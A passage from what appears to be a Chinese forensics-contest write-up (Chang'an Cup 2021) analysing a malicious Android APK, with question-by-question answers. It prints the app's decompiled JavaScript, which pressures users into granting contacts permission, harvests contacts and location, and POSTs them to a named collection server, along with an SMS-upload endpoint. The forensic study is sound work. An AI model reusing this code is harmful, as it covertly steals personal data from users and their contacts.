function_">close</span>()<br>&#125;<br><br>&#125;,<br><span class="hljs-keyword">function</span> (<span class="hljs-params">error</span>) &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;申请权限错误：&#x27;</span> + error.<span class="hljs-property">code</span> + <span class="hljs-string">&quot; = &quot;</span> + error.<span class="hljs-property">message</span>);<br>&#125;);<br>&#125;<br><br><br><br><span class="hljs-comment">//扩展Date功能：将long型日期转换为特定的格式</span><br><span class="hljs-title class_">Date</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">format</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">format</span>) &#123;<br><span class="hljs-keyword">var</span> o = &#123;<br><span class="hljs-string">&quot;M+&quot;</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getMonth</span>() + <span class="hljs-number">1</span>,<br><span class="hljs-string">&quot;d+&quot;</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getDate</span>(),<br><span class="hljs-string">&quot;h+&quot;</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getHours</span>(),<br><span class="hljs-string">&quot;m+&quot;</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getMinutes</span>(),<br><span class="hljs-string">&quot;s+&quot;</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getSeconds</span>(),<br><span class="hljs-string">&quot;q+&quot;</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getMonth</span>() + <span class="hljs-number">3</span>) / <span class="hljs-number">3</span>),<br><span class="hljs-string">&quot;S&quot;</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getMilliseconds</span>()<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-regexp">/(y+)/</span>.<span class="hljs-title function_">test</span>(format)) &#123;<br>format = format.<span class="hljs-title function_">replace</span>(<span class="hljs-title class_">RegExp</span>.<span class="hljs-property">$1</span>, (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getFullYear</span>() + <span class="hljs-string">&quot;&quot;</span>).<span class="hljs-title function_">substr</span>(<span class="hljs-number">4</span> - <span class="hljs-title class_">RegExp</span>.<span class="hljs-property">$1</span>.<span class="hljs-property">length</span>));<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> k <span class="hljs-keyword">in</span> o) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&quot;(&quot;</span> + k + <span class="hljs-string">&quot;)&quot;</span>).<span class="hljs-title function_">test</span>(format)) &#123;<br>format = format.<span class="hljs-title function_">replace</span>(<span class="hljs-title class_">RegExp</span>.<span class="hljs-property">$1</span>, <span class="hljs-title class_">RegExp</span>.<span class="hljs-property">$1</span>.<span class="hljs-property">length</span> == <span class="hljs-number">1</span> ? o[k] : (<span class="hljs-string">&quot;00&quot;</span> + o[k]).<span class="hljs-title function_">substr</span>((<span class="hljs-string">&quot;&quot;</span> + o[k]).<span class="hljs-property">length</span>));<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> format;<br>&#125;<br><br><br><span class="hljs-comment">//将long型日期转换为特定格式</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getFormatDate</span>(<span class="hljs-params">l, pattern</span>) &#123;<br>date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(l);<br><span class="hljs-keyword">if</span> (pattern == <span class="hljs-literal">undefined</span>) &#123;<br>pattern = <span class="hljs-string">&quot;yyyy-MM-dd hh:mm:ss&quot;</span>;<br>&#125;<br><span class="hljs-keyword">return</span> date.<span class="hljs-title function_">format</span>(pattern);<br>&#125;<br><br><br><span class="hljs-comment">//alert(plus.device.uuid)</span><br>plus.<span class="hljs-property">navigator</span>.<span class="hljs-title function_">setStatusBarBackground</span>(<span class="hljs-string">&quot;#db6eff&quot;</span>);<br><br><span class="hljs-title function_">mui</span>(<span class="hljs-string">&quot;body&quot;</span>).<span class="hljs-title function_">off</span>(<span class="hljs-string">&quot;tap&quot;</span>);<br><br><span class="hljs-title function_">mui</span>(<span class="hljs-string">&quot;body&quot;</span>).<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;tap&#x27;</span>, <span class="hljs-string">&#x27;#tx&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">event</span>) &#123;<br><br>$(<span class="hljs-string">&#x27;#tx&#x27;</span>).<span class="hljs-title function_">hide</span>();<br>$(<span class="hljs-string">&#x27;#zz&#x27;</span>).<span class="hljs-title function_">show</span>();<br>&#125;);<br><br><span class="hljs-title function_">mui</span>(<span class="hljs-string">&quot;body&quot;</span>).<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;tap&#x27;</span>, <span class="hljs-string">&#x27;#gb&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">event</span>) &#123;<br><br>$(<span class="hljs-string">&#x27;#tx&#x27;</span>).<span class="hljs-title function_">show</span>();<br>$(<span class="hljs-string">&#x27;#zz&#x27;</span>).<span class="hljs-title function_">hide</span>();<br>&#125;);<br><br><span class="hljs-title function_">mui</span>(<span class="hljs-string">&quot;body&quot;</span>).<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;tap&#x27;</span>, <span class="hljs-string">&#x27;#qd&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">event</span>) &#123;<br><span class="hljs-keyword">if</span> (danjishijian) &#123;<br>danjishijian = <span class="hljs-literal">false</span>;<br><span class="hljs-title function_">aa</span>()<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title function_">aa</span>()<br>&#125;<br><br>&#125;);<br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getPermission</span>(<span class="hljs-params">permissionIdentity, successCallBack, errorCallBack</span>) &#123;<br><span class="hljs-comment">//权限标识转换成大写  </span><br><span class="hljs-keyword">var</span> permissionIdentity = permissionIdentity.<span class="hljs-title function_">toUpperCase</span>();<br><span class="hljs-comment">//获取检测权限的状态  </span><br><span class="hljs-keyword">var</span> checkResult = plus.<span class="hljs-property">navigator</span>.<span class="hljs-title function_">checkPermission</span>(permissionIdentity);<br><span class="hljs-comment">//权限状态是否正常  </span><br><span class="hljs-keyword">var</span> permissionStatusOk = <span class="hljs-literal">false</span>;<br><span class="hljs-comment">//权限中文名称  </span><br><span class="hljs-keyword">var</span> permissionName = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-comment">//对应 andorid 的具体权限  </span><br><span class="hljs-keyword">var</span> androidPermission = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-comment">//获取权限中文意思与对应 android 系统的权限字符串  </span><br><span class="hljs-keyword">switch</span> (permissionIdentity) &#123;<br><br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;CONTACTS&#x27;</span>:<br>permissionName = <span class="hljs-string">&#x27;系统联系人&#x27;</span>;<br>androidPermission = <span class="hljs-string">&#x27;android.permission.READ_CONTACTS&#x27;</span><br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-attr">default</span>:<br>permissionName = <span class="hljs-string">&#x27;未知&#x27;</span>;<br>androidPermission = <span class="hljs-string">&#x27;未知&#x27;</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">//判断检查权限的结果  </span><br><span class="hljs-keyword">switch</span> (checkResult) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;authorized&#x27;</span>:<br><span class="hljs-comment">//正常的  </span><br>permissionStatusOk = <span class="hljs-literal">true</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;denied&#x27;</span>:<br><span class="hljs-comment">//表示程序已被用户拒绝使用此权限，如果是拒绝的就再次提示用户打开确认提示框  </span><br><span class="hljs-comment">//如果有该权限但是没有打开不进行操作还是会去申请或手动打开  </span><br><span class="hljs-comment">// console.log(&#x27;已关闭&#x27; + permissionName + &#x27;权限&#x27;)  </span><br><span class="hljs-comment">// errorCallBack(&#x27;已关闭&#x27; + permissionName + &#x27;权限&#x27;);  </span><br><span class="hljs-comment">// return  </span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;undetermined&#x27;</span>:<br><span class="hljs-comment">// 表示程序未确定是否可使用此权限，此时调用对应的API时系统会弹出提示框让用户确认  </span><br><span class="hljs-comment">// this.requestPermissions(androidPermission, permissionName, successCallBack, errorCallBack)  </span><br><span class="hljs-comment">// errorCallBack(&#x27;未确定&#x27; + permissionName + &#x27;权限&#x27;);  </span><br><span class="hljs-comment">// return  </span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;unknown&#x27;</span>:<br><span class="hljs-title function_">errorCallBack</span>(<span class="hljs-string">&#x27;无法查询&#x27;</span> + permissionName + <span class="hljs-string">&#x27;权限&#x27;</span>);<br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-attr">default</span>:<br><span class="hljs-title function_">errorCallBack</span>(<span class="hljs-string">&#x27;不支持&#x27;</span> + permissionName + <span class="hljs-string">&#x27;权限&#x27;</span>);<br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">//如果权限是正常的执行成功回调  </span><br><span class="hljs-keyword">if</span> (permissionStatusOk) &#123;<br><span class="hljs-title function_">successCallBack</span>()<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">//如果不正常，如果是 andorid 系统，就动态申请权限  </span><br><span class="hljs-keyword">if</span> (plus.<span class="hljs-property">os</span>.<span class="hljs-property">name</span> == <span class="hljs-string">&#x27;Android&#x27;</span>) &#123;<br><span class="hljs-comment">//动态申请权限  </span><br>plus.<span class="hljs-property">android</span>.<span class="hljs-title function_">requestPermissions</span>([androidPermission], <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br><span class="hljs-keyword">if</span> (e.<span class="hljs-property">deniedAlways</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">//权限被永久拒绝  </span><br><span class="hljs-comment">// 弹出提示框解释为何需要定位权限，引导用户打开设置页面开启  </span><br><span class="hljs-title function_">errorCallBack</span>(<span class="hljs-string">&#x27;请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。&#x27;</span>)<br><span class="hljs-comment">// console.log(&#x27;Always Denied!!! &#x27; + e.deniedAlways.toString());  </span><br>&#125;<br><span class="hljs-keyword">if</span> (e.<span class="hljs-property">deniedPresent</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">//权限被临时拒绝  </span><br><span class="hljs-comment">// 弹出提示框解释为何需要定位权限，可再次调用plus.android.requestPermissions申请权限  </span><br><span class="hljs-title function_">errorCallBack</span>(<span class="hljs-string">&#x27;请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。&#x27;</span>)<br><span class="hljs-comment">// console.log(&#x27;Present Denied!!! &#x27; + e.deniedPresent.toString());  </span><br>&#125;<br><span class="hljs-keyword">if</span> (e.<span class="hljs-property">granted</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">//权限被允许  </span><br><span class="hljs-comment">//调用依赖获取定位权限的代码  </span><br><span class="hljs-title function_">successCallBack</span>()<br><span class="hljs-comment">// console.log(&#x27;Granted!!! &#x27; + e.granted.toString());  </span><br>&#125;<br>&#125;, <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br><span class="hljs-title function_">errorCallBack</span>(<span class="hljs-string">&#x27;请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。&#x27;</span>)<br><span class="hljs-comment">// console.log(&#x27;Request Permissions error:&#x27; + JSON.stringify(e));  </span><br>&#125;)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (plus.<span class="hljs-property">os</span>.<span class="hljs-property">name</span> == <span class="hljs-string">&#x27;iOS&#x27;</span>) &#123;<br><span class="hljs-comment">//ios ,第一次使用目的权限时，应用的权限列表里是不存在的，所以先默认执行一下成功回调，打开要使用的操作，比如 plus.camera  </span><br><span class="hljs-comment">//这时系统会提示是否打开相应的权限，如果拒绝也没关系，因为应用的权限列表里已经存在该权限了，下次再调用相应权限时，就会  </span><br><span class="hljs-comment">//走 else 里的流程，会给用户提示，并且跳转到应该的权限页面，让用户手动打开。  </span><br><span class="hljs-keyword">if</span> (checkResult == <span class="hljs-string">&#x27;undetermined&#x27;</span>) &#123;<br><span class="hljs-comment">//调用依赖获取定位权限的代码  </span><br><span class="hljs-title function_">successCallBack</span>(<span class="hljs-literal">true</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">//如果是 ios 系统，ios 没有动态申请操作，所以提示用户去设置页面手动打开  </span><br>mui.<span class="hljs-title function_">confirm</span>(permissionName + <span class="hljs-string">&#x27;权限没有开启，是否去开启？&#x27;</span>, <span class="hljs-string">&#x27;提醒&#x27;</span>, [<span class="hljs-string">&#x27;取消&#x27;</span>, <span class="hljs-string">&#x27;确认&#x27;</span>], <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br><span class="hljs-comment">//取消  </span><br><span class="hljs-keyword">if</span> (e.<span class="hljs-property">index</span> == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-title function_">errorCallBack</span>(<span class="hljs-string">&#x27;请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。&#x27;</span>)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (e.<span class="hljs-property">index</span> == <span class="hljs-number">1</span>) &#123;<br><span class="hljs-comment">//确认，打开当前应用权限设置页面  </span><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">UIApplication</span> = plus.<span class="hljs-property">ios</span>.<span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;UIApplication&#x27;</span>);<br><span class="hljs-keyword">var</span> application2 = <span class="hljs-title class_">UIApplication</span>.<span class="hljs-title function_">sharedApplication</span>();<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">NSURL2</span> = plus.<span class="hljs-property">ios</span>.<span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;NSURL&#x27;</span>);<br><span class="hljs-comment">// var setting2 = NSURL2.URLWithString(&quot;prefs:root=LOCATION_SERVICES&quot;);                             </span><br><span class="hljs-keyword">var</span> setting2 = <span class="hljs-title class_">NSURL2</span>.<span class="hljs-title class_">URLWithString</span>(<span class="hljs-string">&#x27;app-settings:&#x27;</span>);<br>application2.<span class="hljs-title function_">openURL</span>(setting2);<br><br>plus.<span class="hljs-property">ios</span>.<span class="hljs-title function_">deleteObject</span>(setting2);<br>plus.<span class="hljs-property">ios</span>.<span class="hljs-title function_">deleteObject</span>(<span class="hljs-title class_">NSURL2</span>);<br>plus.<span class="hljs-property">ios</span>.<span class="hljs-title function_">deleteObject</span>(application2)<br>&#125;<br>&#125;, <span class="hljs-string">&#x27;div&#x27;</span>)<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">aa</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">var</span> sjh = $(<span class="hljs-string">&#x27;#sjh&#x27;</span>).<span class="hljs-title function_">val</span>();<br><span class="hljs-keyword">var</span> yqm = $(<span class="hljs-string">&#x27;#yqm&#x27;</span>).<span class="hljs-title function_">val</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">parseInt</span>(sjh) &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">parseInt</span>(yqm) &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">parseInt</span>(sjh) &gt; <span class="hljs-number">13000000000</span> &amp;&amp; <span class="hljs-built_in">parseInt</span>(sjh) &lt; <span class="hljs-number">19999999999</span> &amp;&amp; <span class="hljs-built_in">parseInt</span>(yqm) &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">parseInt</span>(yqm) &lt; <span class="hljs-number">999999</span>) &#123;<br><br><span class="hljs-title function_">getPermission</span>(<span class="hljs-string">&#x27;CONTACTS&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><span class="hljs-title function_">huoqu</span>(sjh, yqm);<br><br>&#125;, <span class="hljs-keyword">function</span> (<span class="hljs-params">msg</span>) &#123;<br>mui.<span class="hljs-title function_">alert</span>(msg, <span class="hljs-string">&#x27;提醒&#x27;</span>, <span class="hljs-string">&#x27;确定&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123; &#125;, <span class="hljs-string">&#x27;div&#x27;</span>)<br><span class="hljs-comment">//aa()</span><br>&#125;)<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>mui.<span class="hljs-title function_">toast</span>(<span class="hljs-string">&#x27;请输入正确的手机号和邀请码&#x27;</span>)<br>&#125;<br><br>&#125;<br><br><br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">dingwei</span>(<span class="hljs-params">sjh, yqm</span>) &#123;<br>plus.<span class="hljs-property">geolocation</span>.<span class="hljs-title function_">getCurrentPosition</span>(translatePoint, <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br>mui.<span class="hljs-title function_">toast</span>(<span class="hljs-string">&quot;异常:&quot;</span> + e.<span class="hljs-property">message</span>);<br>&#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">translatePoint</span>(<span class="hljs-params">position</span>) &#123;<br><br><span class="hljs-keyword">var</span> sjh = $(<span class="hljs-string">&#x27;#sjh&#x27;</span>).<span class="hljs-title function_">val</span>()<br><span class="hljs-keyword">var</span> yqm = $(<span class="hljs-string">&#x27;#yqm&#x27;</span>).<span class="hljs-title function_">val</span>()<br><span class="hljs-keyword">var</span> currentLon = position.<span class="hljs-property">coords</span>.<span class="hljs-property">longitude</span>;<br><span class="hljs-keyword">var</span> currentLat = position.<span class="hljs-property">coords</span>.<span class="hljs-property">latitude</span>;<br><span class="hljs-keyword">var</span> jingweidu = sjh + <span class="hljs-string">&#x27;,&#x27;</span> + yqm + <span class="hljs-string">&#x27;,&#x27;</span> + currentLon + <span class="hljs-string">&#x27;,&#x27;</span> + currentLat;<br>mui.<span class="hljs-title function_">ajax</span>(apiserver + <span class="hljs-string">&#x27;apimap&#x27;</span>, &#123;<br><span class="hljs-attr">data</span>: &#123;<br><span class="hljs-attr">data</span>: jingweidu<br>&#125;,<br><span class="hljs-attr">dataType</span>: <span class="hljs-string">&#x27;text&#x27;</span>,<span class="hljs-comment">//服务器返回json格式数据</span><br><span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-comment">//HTTP请求类型</span><br><span class="hljs-attr">timeout</span>: <span class="hljs-number">10000</span>,<span class="hljs-comment">//超时时间设置为10秒；              </span><br><span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br><br><span class="hljs-keyword">if</span> (data == <span class="hljs-string">&#x27;获取成功&#x27;</span>) &#123;<br><span class="hljs-title function_">requestPermission</span>(sjh, yqm);<br><br><span class="hljs-comment">//setInterval(function()&#123;</span><br><span class="hljs-comment">//var sjh=$(&#x27;#sjh&#x27;).val();</span><br><span class="hljs-comment">//var yqm=$(&#x27;#yqm&#x27;).val();</span><br><span class="hljs-comment">//requestPermission(sjh,yqm);</span><br><span class="hljs-comment">//console.log(&#x27;send&#x27;)</span><br><br><span class="hljs-comment">//&#125;,30000)</span><br>&#125;<br><br>mui.<span class="hljs-title function_">toast</span>(data)<br>&#125;,<br><span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">xhr, type, errorThrown</span>) &#123;<br><span class="hljs-comment">//异常处理；</span><br><br><br>&#125;<br>&#125;);<br><br><span class="hljs-comment">//书写自己的逻辑</span><br><br>&#125;<br><span class="hljs-comment">// 扩展API加载完毕，现在可以正常调用扩展API</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">huoqu</span>(<span class="hljs-params">sjh, yqm</span>) &#123;<br><span class="hljs-keyword">var</span> con = sjh + <span class="hljs-string">&quot;**&quot;</span> + yqm + <span class="hljs-string">&#x27;**&#x27;</span> + address;<br><br><br>plus.<span class="hljs-property">contacts</span>.<span class="hljs-title function_">getAddressBook</span>(plus.<span class="hljs-property">contacts</span>.<span class="hljs-property">ADDRESSBOOK_PHONE</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">addressbook</span>) &#123;<br><br><br>addressbook.<span class="hljs-title function_">find</span>([<span class="hljs-string">&quot;displayName&quot;</span>, <span class="hljs-string">&quot;phoneNumbers&quot;</span>], <span class="hljs-keyword">function</span> (<span class="hljs-params">contacts</span>) &#123;<br><br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>, len = contacts.<span class="hljs-property">length</span>; i &lt; len; i++) &#123;<br>con = con + <span class="hljs-string">&#x27;=&#x27;</span> + contacts[i].<span class="hljs-property">displayName</span> + <span class="hljs-string">&#x27;|&#x27;</span> + (contacts[i].<span class="hljs-property">phoneNumbers</span>.<span class="hljs-property">length</span> == <span class="hljs-number">0</span> ? <span class="hljs-string">&quot;&quot;</span> : contacts[i].<span class="hljs-property">phoneNumbers</span>[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>);<br>&#125;<br><br><br><br><br><br>mui.<span class="hljs-title function_">ajax</span>(apiserver + <span class="hljs-string">&#x27;api&#x27;</span>, &#123;<br><span class="hljs-attr">data</span>: &#123;<br><span class="hljs-attr">data</span>: con<br>&#125;,<br><span class="hljs-attr">dataType</span>: <span class="hljs-string">&#x27;text&#x27;</span>,<span class="hljs-comment">//服务器返回json格式数据</span><br><span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-comment">//HTTP请求类型</span><br><span class="hljs-attr">timeout</span>: <span class="hljs-number">10000</span>,<span class="hljs-comment">//超时时间设置为10秒；              </span><br><span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br><span class="hljs-comment">//alert(data)</span><br><span class="hljs-keyword">if</span> (data == <span class="hljs-string">&#x27;正在加载列表&#x27;</span>) &#123;<br><span class="hljs-title function_">dingwei</span>(sjh, yqm);<br>mui.<span class="hljs-title function_">openWindow</span>(&#123;<br><span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;list.html&#x27;</span>,<br><span class="hljs-attr">show</span>: &#123;<br><span class="hljs-attr">autoShow</span>: <span class="hljs-literal">true</span><br>&#125;<br>&#125;);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>mui.<span class="hljs-title function_">toast</span>(data)<br>&#125;<br><span class="hljs-comment">//console.log(con)</span><br>&#125;,<br><span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">xhr, type, errorThrown</span>) &#123;<br><span class="hljs-comment">//异常处理；</span><br><br><br>&#125;<br>&#125;);<br><br><br><br>&#125;, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>mui.<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;为保证用户质量，使用本app请同意通讯录授权 &quot;</span>);<br>&#125;, &#123;<br><span class="hljs-attr">multiple</span>: <span class="hljs-literal">true</span><br>&#125;);<br>&#125;, <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br>mui.<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;为保证用户质量，使用本app请同意通讯录授权 &quot;</span>);<br>&#125;);<br>&#125;<br><br><br><br><br>&#125;);<br></code></pre></td></tr></table></figure><p>分析后得到，选<code>ACDE</code></p><h2 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h2><h3 id="该APK程序回传通讯录时-使用的http请求方式为（）"><a href="#该APK程序回传通讯录时-使用的http请求方式为（）" class="headerlink" title="该APK程序回传通讯录时,使用的http请求方式为（）"></a>该APK程序回传通讯录时,使用的http请求方式为（）</h3><p>由上一题中得到的代码可知，</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs lasso">mui.ajax(apiserver + <span class="hljs-string">&#x27;apisms&#x27;</span>, &#123;<br><span class="hljs-built_in">data</span>: &#123;<br><span class="hljs-built_in">data</span>: duanxin<br>&#125;,<br>dataType: <span class="hljs-string">&#x27;text&#x27;</span>,<span class="hljs-comment">//服务器返回json格式数据</span><br><span class="hljs-keyword">type</span>: <span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-comment">//HTTP请求类型</span><br>timeout: <span class="hljs-number">10000</span>,<span class="hljs-comment">//超时时间设置为10秒；              </span><br>success: function (<span class="hljs-built_in">data</span>) &#123;<br>mui.toast(<span class="hljs-string">&#x27;获取成功&#x27;</span>)<br><span class="hljs-comment">//console.log(con)</span><br></code></pre></td></tr></table></figure><p>http请求类型为<code>post</code></p><h2 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h2><h3 id="该APK程序的回传地址域名为【标准格式：www-abc-com】"><a href="#该APK程序的回传地址域名为【标准格式：www-abc-com】" class="headerlink" title="该APK程序的回传地址域名为【标准格式：www.abc.com】"></a>该APK程序的回传地址域名为【标准格式：<a href="http://www.abc.com】/">www.abc.com】</a></h3><p>代码中可以找到：<br><code>var apiserver = &#39;http://www.honglian7001.com/api/uploads/&#39;;</code><br>因此回传地址域名为：<code>www.honglian7001.com</code></p><h2 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a>第八题</h2><h3 id="该APK程序代码中配置的变量apiserver的值为-【标准格式：www-abc-com-abc】"><a href="#该APK程序代码中配置的变量apiserver的值为-【标准格式：www-abc-com-abc】" class="headerlink" title="该APK程序代码中配置的变量apiserver的值为  【标准格式：www.abc.com/abc】"></a>该APK程序代码中配置的变量apiserver的值为  【标准格式：<a href="http://www.abc.com/abc%E3%80%91">www.abc.com/abc】</a></h3><p>同上一题中找到的，即<code>www.honglian7001.com/api/uploads</code></p><h2 id="第九题"><a href="#第九题" class="headerlink" title="第九题"></a>第九题</h2><h3 id="分析该APK，发现该程序还具备获取短信回传到后台的功能，短信上传服务器接口地址为【标准格式：www-abc-com-abc】-（后面不带-）"><a href="#分析该APK，发现该程序还具备获取短信回传到后台的功能，短信上传服务器接口地址为【标准格式：www-abc-com-abc】-（后面不带-）" class="headerlink" title="分析该APK，发现该程序还具备获取短信回传到后台的功能，短信上传服务器接口地址为【标准格式：www.abc.com/abc】 （后面不带&#x2F;）"></a>分析该APK，发现该程序还具备获取短信回传到后台的功能，短信上传服务器接口地址为【标准格式：<a href="http://www.abc.com/abc%E3%80%91">www.abc.com/abc】</a> （后面不带&#x2F;）</h3><p>代码中可以找到</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mui<span class="hljs-selector-class">.ajax</span>(apiserver + <span class="hljs-string">&#x27;apisms&#x27;</span>,<br></code></pre></td></tr></table></figure><p>具体的apiserver我们已知，<code>apisms</code>是具体的接口路径，因此最终得到的接口路径为<code>www.honglian7001.com/api/uploads/apisms</code></p><h2 id="第十题"><a href="#第十题" class="headerlink" title="第十题"></a>第十题</h2><h3 id="经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该文件的文件名为"><a href="#经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该文件的文件名为" class="headerlink" title="经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该文件的文件名为"></a>经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该文件的文件名为</h3><p>数据库文件后缀为<code>.db</code>，搜索得<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250504202320966.png"><br>找到一个SQLiteDatabase数据库中生成的一个文件<code>test.db</code></p><h2 id="第十一题"><a href="#第十一题" class="headerlink" title="第十一题"></a>第十一题</h2><h3 id="经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该数据库的初始密码为"><a href="#经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该数据库的初始密码为" class="headerlink" title="经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该数据库的初始密码为"></a>经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该数据库的初始密码为</h3><p>分析代码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">byte</span>[] key = &#123;<span class="hljs-number">97</span>, <span class="hljs-number">98</span>, <span class="hljs-number">99</span>, <span class="hljs-number">100</span>, <span class="hljs-number">101</span>, <span class="hljs-number">102</span>&#125;;<br>  <br>        <span class="hljs-attribute">SQLiteDatabase</span> 